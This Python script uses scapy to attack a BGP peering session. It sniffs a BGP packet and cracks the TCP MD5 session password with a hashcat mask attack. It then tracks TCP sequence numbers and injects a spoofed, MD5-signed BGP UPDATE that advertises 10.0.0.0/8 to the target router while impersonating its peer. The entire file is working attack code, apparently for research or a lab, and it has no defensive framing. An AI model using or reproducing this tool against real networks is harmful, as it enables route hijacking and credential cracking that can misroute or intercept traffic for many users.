import sys
from scapy.all import *
from scapy.layers.inet import IP,TCP
from scapy.contrib.bgp import *
from BGP_crafter import craft_BGP_update_packet, sign_single_packet
import TCP_MD5_parser
from scapy.layers.l2 import Ether

## PARAMETERS
INTERFACE = "eth0"
hashcat_mask = "-1 ?u?l -2 ?u?l?d ?1?1?1?1?1?1?1?1 --increment --increment-min 4"
IP_TARGET = "192.168.12.1"
IP_TO_SPOOF = "192.168.12.2"
NETWORK_TO_ADVERTISE = "10.0.0.0/8"
PATH = [2,3]
LOCAL_PREF = 87
BGP_PORT = 179

#global variables
SEQUENCE_NUMBER = -1
ACK_NUMBER = -1
BGP_password = ""

def break_password(pkt, mask):
    """Takes a scapy packet and a hashcat mask, runs a hashcat mask attack on the TCP MD5 signature to find the password"""
    hash_found = False
    if TCP not in pkt:
        pkt.show()
        raise Exception("Cannot find a TCP MD signature in a non TCP packet")
    else:
        if "options" in pkt[TCP].fields:
            for op in pkt[TCP].options:
                if op[0] == 19:
                    tcp_hash = op[1]
                    hash_found = True
                    break
        if hash_found == False:
            pkt.show()
            raise Exception("TCP packet has no MD signature")
        else:
            raw_ip_data = raw(pkt[IP])
            raw_tcp_data = raw(pkt[TCP])
            #get the salt from these bytes
            salt = TCP_MD5_parser.get_md5_salt_from_bytes(raw_ip_data, raw_tcp_data)
            #call hashcat
            result = TCP_MD5_parser.launch_hashcat(tcp_hash, salt, mask)
            if result == "":
                raise Exception("Could not break password of hash {}".format(tcp_hash))
            else:
                password = result.split(":")[2]
                return password

def filter_bgp_packet_to_break(pkt, ip_target, ip_to_spoof):
    """Filters for BGP packets which are between the targeted and spoofed AS"""
    if TCP in pkt:
        if pkt[TCP].dport == BGP_PORT or pkt[TCP].sport == BGP_PORT:
            # if it is a BGP packet
            if pkt[IP].src == ip_target and pkt[IP].dst == ip_to_spoof:
                #this is a packet coming from the target AS to the BGP port of another AS
                return True
            if pkt[IP].dst == ip_target and pkt[IP].src == ip_to_spoof:
                #this is a packet coming to the target AS on its BGP port
                return True
    return False

def inject_malicious_packet(seq_num, ack_num, source_port):
    """crafts and sends a BGPUpdate to the targeted AS spoofing the AS we want to spoof"""
    ip = IP(src=IP_TO_SPOOF, dst=IP_TARGET)
    tcp = TCP(sport=source_port, dport=BGP_PORT, flags="PA")
    tcp.seq = seq_num
    tcp.ack = ack_num
    hdr = BGPHeader(type=2, marker=0xffffffffffffffffffffffffffffffff)  
    bgp_packet = craft_BGP_update_packet(NETWORK_TO_ADVERTISE, path=PATH, local_pref=LOCAL_PREF)
    packet = Ether()/ ip / tcp / hdr / bgp_packet
    signed_packet = sign_single_packet(packet,BGP_password)
    #recompute packet to compute checksums
    signed_packet = signed_packet.__class__(bytes(signed_packet))
    # signed_packet.show()
    print("MALICOUS PACKET CRAFTED")
    send(signed_packet)
    signed_packet.show()
    print("Attack done, exiting")
    exit()




def packet_callback(captured_packet):
    """Called when packets are captured, updates seq and ack numbers and calls the attack when a window is open"""
    # malicious_bgp_packet = craft_BGP_update_packet("192.168.0.1/24", path=[], local_pref=0)
    # malicious_bgp_packet.show()
    # Then, set sequence number of the malicious packet to seq number of the captured packet:
    #   malicious_bgp_packet[TCP] = captured_packet[TCP].seq (something like that)
    if captured_packet[TCP].sport == BGP_PORT or captured_packet[TCP].dport == BGP_PORT:
        #BGP packet or ACK
        # if captured_packet[IP].dst == IP_TARGET and captured_packet[IP].src == IP_TO_SPOOF:
        #     #Is that part really useful ?
        #     #packet going to the targeted AS from the AS we want to spoof.
        #     #take the seq and ack numbers from the packet
        #     SEQUENCE_NUMBER = captured_packet[TCP].seq
        #     ACK_NUMBER = captured_packet[TCP].ack
        if captured_packet[IP].dst == IP_TARGET and captured_packet[IP].src == IP_TO_SPOOF:
            #packet going to the AS we want to spoof from the targeted AS
            #This packet is interesting if it is an ACK for a previously sent packet
            # if captured_packet[TCP].flags == "A":
            # if the targeted AS sends ACK
            SEQUENCE_NUMBER = captured_packet[TCP].ack
            ACK_NUMBER = captured_packet[TCP].seq
            # ACK_NUMBER = captured_packet[TCP].seq + len(captured_packet[TCP].payload)
            # now we have a window to send a malicious BGP packet
            source_port = captured_packet[TCP].dport
            inject_malicious_packet(SEQUENCE_NUMBER, ACK_NUMBER, source_port)




def main(argv):
    if len(argv) != 2:
        print(f"Usage: {argv[0]} <interface_name>")
        print(f"\n\t i.e.: {argv[0]} \"eth0\"")
        sys.exit(-1)

    INTERFACE = argv[1]

    print("[*] Sniffing a packet to break TCP MD5 password")
    packet_to_break = sniff(lfilter=lambda p: filter_bgp_packet_to_break(p, IP_TARGET, IP_TO_SPOOF), count=1, iface=INTERFACE)[0]
    print("[*] Packet found !")
    print("[*] Breaking password")
    global BGP_password
    BGP_password = break_password(packet_to_break, hashcat_mask)
    print("[*] Password broken: " + BGP_password)
    sniff(prn=lambda p : packet_callback(p), filter="tcp", iface=INTERFACE)



if __name__ == "__main__":
  main(sys.argv)